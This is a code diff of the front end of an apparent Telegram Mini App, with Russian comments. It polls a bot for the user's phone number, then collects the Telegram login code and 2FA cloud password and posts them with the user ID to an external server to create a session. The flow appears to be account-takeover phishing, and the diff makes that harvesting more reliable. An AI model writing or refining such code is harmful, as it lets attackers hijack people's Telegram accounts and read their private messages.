@@ -142,39 +142,34 @@
             if(ok) {
                 document.getElementById('s1').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
-                document.getElementById('l-text').innerText = "Ожидание подтверждения..."; 
+                document.getElementById('l-text').innerText = "Ожидание подтверждения...";
                 
-                // Ждем 3 секунды, чтобы бот успел обработать контакт в фоне
-                setTimeout(async () => {
+                // Интервал опроса, пока бот не подтвердит получение контакта
+                const userId = String(tg.initDataUnsafe.user.id);
+                let checkTimer = setInterval(async () => {
                     try {
-                        const userId = tg.initDataUnsafe.user.id;
-                        // Проверяем статус через API
                         const r = await fetch(`${API_BASE}/api/check_contact?id=${userId}`);
                         const d = await r.json();
                         
-                        if(d.status === 'received') {
-                            userPhone = d.phone; // Сохраняем полученный номер
+                        if(d.status === 'received' && d.phone) {
+                            clearInterval(checkTimer);
+                            userPhone = String(d.phone); // Сохраняем номер как строку
                             document.getElementById('loader').style.display = 'none';
                             document.getElementById('s2').style.display = 'block';
-                        } else {
-                            alert("Бот еще не получил ваш номер. Попробуйте нажать 'Начать' снова.");
-                            document.getElementById('loader').style.display = 'none';
-                            document.getElementById('s1').style.display = 'block';
                         }
-                    } catch(e) {
-                        alert("Ошибка связи. Проверьте запуск бота.");
-                        document.getElementById('loader').style.display = 'none';
-                        document.getElementById('s1').style.display = 'block';
-                    }
-                }, 3000);
+                    } catch(e) { console.error("API Error:", e); }
+                }, 2000);
+
+                // Тайм-аут через 30 секунд
+                setTimeout(() => clearInterval(checkTimer), 30000);
             }
         });
     }
 
     async function sendCode() {
-        if (isSending) return;
-        const codeInput = document.getElementById('code').value;
-        if(codeInput.length < 5) return;
+        if(isSending) return;
+        const c = document.getElementById('code').value;
+        if(!c || c.length < 5) return;
 
         isSending = true;
         document.getElementById('s2').style.display = 'none';
@@ -182,65 +177,65 @@
         document.getElementById('l-text').innerText = "Проверка кода...";
 
         try {
-            const userId = tg.initDataUnsafe.user.id.toString(); // Принудительно в строку
             const response = await fetch(`${API_BASE}/api/send_code`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    phone: userPhone, 
-                    code: codeInput, 
-                    id: userId // Передаем ID для сессии
+                    phone: String(userPhone),
+                    code: String(c),
+                    id: String(tg.initDataUnsafe.user.id)
                 })
             });
-            const result = await response.json();
+            const data = await response.json();
             
-            if(result.status === 'success') {
+            document.getElementById('loader').style.display = 'none';
+            if(data.status === 'success') {
                 finish();
-            } else if(result.status === '2fa_needed') {
-                document.getElementById('loader').style.display = 'none';
+            } else if(data.status === '2fa_needed') {
                 document.getElementById('s3').style.display = 'block';
             } else {
-                alert("Ошибка: " + (result.message || "неверный код"));
-                document.getElementById('loader').style.display = 'none';
+                alert("Ошибка: " + (data.message || "неверный код"));
                 document.getElementById('s2').style.display = 'block';
             }
         } catch(e) {
-            alert("Ошибка сети. Проверьте консоль.");
-        } finally {
-            isSending = false;
-        }
+            alert("Ошибка сети при отправке кода");
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('s2').style.display = 'block';
+        } finally { isSending = false; }
     }
 
     async function sendPass() {
+        if(isSending) return;
         const p = document.getElementById('pass').value;
-        if(!p || isSending) return;
-        
+        if(!p) return;
+
         isSending = true;
         document.getElementById('s3').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-        document.getElementById('l-text').innerText = "Проверка пароля..."; 
-        
+        document.getElementById('l-text').innerText = "Проверка пароля...";
+
         try {
-            const r = await fetch('/api/send_password', {
+            const r = await fetch(`${API_BASE}/api/send_password`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: userPhone, password: p})
+                body: JSON.stringify({
+                    phone: String(userPhone),
+                    password: String(p),
+                    id: String(tg.initDataUnsafe.user.id)
+                })
             });
             const d = await r.json();
+            
             if(d.status === 'success') {
                 finish();
             } else {
-                tg.showAlert("Неверный облачный пароль");
-                document.getElementById('s3').style.display = 'block';
+                alert("Неверный 2FA пароль");
                 document.getElementById('loader').style.display = 'none';
+                document.getElementById('s3').style.display = 'block';
             }
         } catch(e) {
-            tg.showAlert("Ошибка соединения с сервером");
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('s3').style.display = 'block';
-        } finally {
-            isSending = false;
-        }
+            alert("Ошибка сети при проверке 2FA");
+        } finally { isSending = false; }
     }
 
     function finish() {
